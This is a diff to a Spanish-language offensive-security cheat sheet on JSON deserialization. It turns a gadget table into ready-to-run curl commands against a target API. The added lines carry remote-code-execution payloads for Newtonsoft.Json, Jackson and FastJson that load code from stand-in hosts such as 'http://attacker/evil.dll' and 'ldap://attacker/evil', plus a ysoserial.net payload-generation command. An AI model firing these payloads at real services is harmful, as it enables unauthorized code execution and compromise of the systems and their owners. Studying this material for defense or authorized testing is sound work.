@@ -26,19 +26,15 @@ linked:
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Newtonsoft.Json TypeNameHandling | `{"$type":"System.IO.FileInfo, mscorlib","fileName":"path"}` | Si `TypeNameHandling = All / Auto / Objects` → instancia tipos arbitrarios. |
-| JSON.NET RCE | `{"$type":"System.Configuration.Install.AssemblyInstaller, System.Configuration.Install","Path":"http://attacker/evil.dll"}` | Carga assembly remoto. |
-| JSON.NET via System.Windows.Data | Gadget `ObjectDataProvider` | Igual que XAML. |
-| Jackson polymorphic (Java) | `["org.springframework.context.support.ClassPathXmlApplicationContext", "http://attacker/spel.xml"]` | Default typing habilitado o `@JsonTypeInfo`. |
-| Jackson sub-types CVE-list | CVE-2017-7525, CVE-2017-15095, CVE-2018-7489, CVE-2019-12384, CVE-2020-9546+ | Decenas de gadgets — cada uno bypasea la blacklist anterior. |
-| Jackson HikariConfig gadget | `["com.zaxxer.hikari.HikariConfig", {"metricRegistry":"jdbc:mysql:..."}]` | RCE via JDBC. |
-| Jackson Logback gadget | `["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:..."}]` | Misma idea. |
-| FastJson (Alibaba) | `{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker/evil","autoCommit":true}` | RCE clásico FastJson 1.2.x. |
-| FastJson reference bypass | `{"@type":"L<class>;"}` — formato de referencia Java | Bypass de blacklist de class name. |
-| FastJson CVE-2022-25845 | Bypass via `safeMode = false` y class no listada | Listas de gadgets en awesome-fastjson. |
-| FastJson auto-type | `{"@type":"...","..."}` con `setAutoTypeSupport(true)` | Bypass siempre disponible. |
-| Jackson @class | Equivalente a $type de .NET | Notación distinta misma idea. |
-| Jsonnet / Boon | Otras libs Java con polymorphism vulnerable | CVE list propia. |
+| `curl -X POST -H "Content-Type: application/json" -d '{"$type":"System.IO.FileInfo, mscorlib","fileName":"path"}' https://target/api/x` | Newtonsoft.Json TypeNameHandling abuse — instancia tipos arbitrarios | TypeNameHandling=All/Auto/Objects. |
+| `curl -X POST -H "Content-Type: application/json" -d '{"$type":"System.Configuration.Install.AssemblyInstaller, System.Configuration.Install","Path":"http://attacker/evil.dll"}' https://target/api/x` | RCE via remote assembly load | JSON.NET con TypeNameHandling. |
+| `curl -X POST -d '["org.springframework.context.support.ClassPathXmlApplicationContext","http://attacker/spel.xml"]' https://target/api/x` | Jackson polymorphic RCE via XML context load | Default typing o `@JsonTypeInfo`. |
+| `curl -X POST -d '["com.zaxxer.hikari.HikariConfig",{"metricRegistry":"jdbc:mysql:..."}]' https://target/api/x` | Jackson HikariConfig JDBC RCE | Jackson + HikariCP. |
+| `curl -X POST -d '["ch.qos.logback.core.db.DriverManagerConnectionSource",{"url":"jdbc:..."}]' https://target/api/x` | Jackson Logback JDBC RCE | Jackson + Logback. |
+| `curl -X POST -d '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker/evil","autoCommit":true}' https://target/api/x` | FastJson 1.2.x JdbcRowSetImpl RCE | Alibaba FastJson clásico. |
+| `curl -X POST -d '{"@type":"L<class>;"}' https://target/api/x` (formato referencia Java) | FastJson reference bypass class blacklist | Blacklist sobre class name. |
+| `ysoserial.net.exe -g ObjectDataProvider -f Json.Net -c "calc"` y POST resultado | Generate JSON.NET payload con tool | Newtonsoft TypeNameHandling. |
+^deser-fmt-json
 ^deser-fmt-json
 
 ### JSON.NET vulnerable config
